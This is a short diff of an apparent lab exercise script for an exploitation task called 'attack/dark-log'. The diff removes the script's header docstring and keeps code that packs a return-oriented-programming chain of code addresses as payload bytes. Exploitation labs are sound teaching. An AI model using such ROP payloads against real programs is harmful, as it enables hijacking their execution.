@@ -1,9 +1,3 @@
-#!/usr/bin/env python3
-"""Task 4: build the payload for attack/dark-log.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
-
 import sys
 import struct
 rop = struct.pack("<QQQQ", 0x4018a3, 4, 0x4018a4, 0x401677)
